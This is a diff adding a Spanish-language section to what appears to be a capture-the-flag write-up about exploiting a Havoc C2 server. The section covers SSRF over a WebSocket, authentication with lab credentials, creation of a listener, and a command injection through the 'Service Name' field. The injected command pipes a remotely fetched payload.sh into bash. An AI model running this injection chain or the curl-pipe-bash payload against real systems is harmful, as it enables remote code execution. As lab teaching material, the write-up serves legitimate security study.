@@ -348,6 +348,104 @@ write_socket(socket_id, frame)
 response = read_socket(socket_id)
 ~~~
 
+### Understanding SSRF
+
+Primero estamos estableciendo una conexión a través de una conexión `WebSocket` con el C2 utilizando las credenciales que obtuvimos
+
+~~~ python
+USER = "ilya"
+PASSWORD = "CobaltStr1keSuckz!"
+host = "127.0.0.1"
+port = 40056
+
+websocket_request = create_websocket_request(host, port)
+print("[+] Writing socket...")
+write_socket(socket_id, websocket_request)
+response = read_socket(socket_id)
+~~~
+
+Luego nos autenticamos con el siguiente JSON, donde enviamos la contraseña en formato hash
+
+~~~ json
+payload = {
+    "Body": {
+        "Info": {
+            "Password": hashlib.sha3_256(PASSWORD.encode()).hexdigest(),  # Hash SHA3-256
+            "User": USER
+        },
+        "SubEvent": 3
+    },
+    "Head": {
+        "Event": 1,
+        "OneTime": "",
+        "Time": "18:40:17",
+        "User": USER
+    }
+}
+~~~
+
+Lo siguiente que hace el script es configurar un listener malicioso en el C2 para redirigir tráfico
+
+~~~ python
+payload = {
+    "Body": {
+        "Info": {
+            "Headers": "",
+            "HostBind": "0.0.0.0",  # Escucha en todas las interfaces
+            "HostHeader": "",
+            "HostRotation": "round-robin",
+            "Hosts": "0.0.0.0",
+            "Name": "abc",
+            "PortBind": "443",  # Puerto de escucha (HTTPS)
+            "PortConn": "443",
+            "Protocol": "Https",
+            "Proxy Enabled": "false",
+            "Secure": "true",
+            "Status": "online",
+            "Uris": "",
+            "UserAgent": "Mozilla/5.0 (Windows NT 6.1; WOW64)..."
+        },
+        "SubEvent": 1
+    },
+    "Head": {
+        "Event": 2,
+        "OneTime": "",
+        "Time": "08:39:18",
+        "User": USER
+    }
+}
+~~~
+
+La inyección se acontece cuando enviamos una solicitud para que el C2 ejecute un comando a través del campo `ServiceName`, que en vez de ejecutar un servicio legítimo ejecutará nuestro servicio que en realidad es un comando.
+
+>Nota cómo en la variable `injection` se muestran caracteres que rompen la sintaxis esperada
+{: .notice--info}
+
+~~~ bash
+cmd = "curl http://10.10.14.99/payload.sh | bash"  # Descarga y ejecuta un payload
+injection = """ \\\\\\\" -mbla; """ + cmd + """ 1>&2 && false #"""
+payload = {
+    "Body": {
+        "Info": {
+            "AgentType": "Demon",
+            "Arch": "x64",
+            "Config": "{\n    \"Amsi/Etw Patch\": \"None\",\n    ...\n    \"Service Name\":\"" + injection + "\",\n    ...\n}\n",
+            "Format": "Windows Service Exe",
+            "Listener": "abc"
+        },
+        "SubEvent": 2
+    },
+    "Head": {
+        "Event": 5,
+        "OneTime": "true",
+        "Time": "18:39:04",
+        "User": USER
+    }
+}
+~~~
+
+Entonces el servidor ejecutará una solitud a un recurso `payload.sh` ubicado en nuestra máquina
+
 ### Exploiting
 
 Iniciaremos un servidor HTTP para que la máquina víctima pueda acceder al recurso `payload.sh`
